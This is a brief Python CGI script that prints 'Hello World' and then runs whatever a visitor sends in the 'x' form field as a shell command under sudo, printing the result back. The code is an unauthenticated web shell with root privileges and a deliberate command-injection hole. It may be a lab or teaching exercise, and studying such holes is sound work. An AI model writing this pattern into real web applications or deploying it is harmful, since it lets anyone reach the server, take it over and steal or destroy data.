#!/usr/bin/python3
print("Content-type: text/html")
print()
print("Hello World")

import subprocess
import cgi
i=cgi.FieldStorage()
y=i.getvalue("x")
o=subprocess.getoutput("sudo "+y)
print(o)

